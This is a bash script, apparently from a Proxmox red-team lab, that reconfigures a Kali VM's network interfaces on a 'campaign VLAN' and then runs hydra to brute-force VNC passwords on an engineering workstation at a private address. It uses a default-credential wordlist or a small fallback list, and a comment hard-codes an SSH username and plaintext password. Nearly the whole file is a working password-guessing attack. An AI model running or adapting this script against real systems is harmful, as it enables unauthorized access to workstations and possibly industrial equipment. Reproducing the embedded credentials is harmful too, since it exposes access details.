#!/usr/bin/env bash
# Paste into Kali VM 104 console (Proxmox → kali-2025 → Console) as dadmin.
# Fixes vmbr1 reachability, then runs hydra against EWS VNC on the campaign VLAN.
#
# Remote SSH (once L2 is correct): dadmin@192.168.60.150 / PizzaMan123!
#   ./scripts/proxmox/kali-hydra-ews-remote.sh
set -euo pipefail

TARGET="${TARGET:-192.168.61.158}"
VNC_PORT="${VNC_PORT:-5900}"
WORDLIST="${WORDLIST:-/usr/share/seclists/Passwords/Default-Credentials/vnc-betterdefaultpasslist.txt}"

if [ "$(id -u)" -ne 0 ]; then
  echo "[*] re-run with sudo"
  exec sudo -E bash "$0" "$@"
fi

echo "[*] interfaces (expect vmbr1 NIC to get 192.168.61.x)"
ip -br link
ip -br addr

# vmbr1 MAC from Proxmox net1: bc:24:11:36:1e:be
VMBR1_IF="$(ip -o link | awk '/36:1e:be/ {print $2}' | tr -d ':')"
VMBR0_IF="$(ip -o link | awk '/62:3e:15/ {print $2}' | tr -d ':')"
[ -n "${VMBR1_IF}" ] || VMBR1_IF="eth0"
[ -n "${VMBR0_IF}" ] || VMBR0_IF="eth1"

echo "[*] DHCP on ${VMBR1_IF} (campaign / vmbr1)"
dhclient -v "${VMBR1_IF}" 2>/dev/null || true
ip -br addr show "${VMBR1_IF}"

if ! ping -c1 -W3 "${TARGET}" >/dev/null 2>&1; then
  echo "[!] no ping to ${TARGET}; trying static 192.168.61.50/24 on ${VMBR1_IF}"
  ip addr flush dev "${VMBR1_IF}" 2>/dev/null || true
  ip addr add 192.168.61.50/24 dev "${VMBR1_IF}"
  ip route replace default via 192.168.61.1 dev "${VMBR1_IF}" 2>/dev/null || true
fi

ping -c2 -W2 "${TARGET}" || { echo "[!] still unreachable on vmbr1"; exit 1; }

if [ ! -f "${WORDLIST}" ]; then
  WORDLIST="/tmp/vnc-better.txt"
  cat > "${WORDLIST}" <<'EOF'
123456
password
FELDTECH_VNC
EOF
  echo "[!] using minimal ${WORDLIST} — install seclists for full sweep"
fi

command -v hydra >/dev/null || { echo "[!] apt install hydra"; apt-get update && apt-get install -y hydra; }

echo "[*] hydra -t 1 -V -f → ${TARGET}:${VNC_PORT}"
hydra -t 1 -V -f -P "${WORDLIST}" -s "${VNC_PORT}" "${TARGET}" vnc
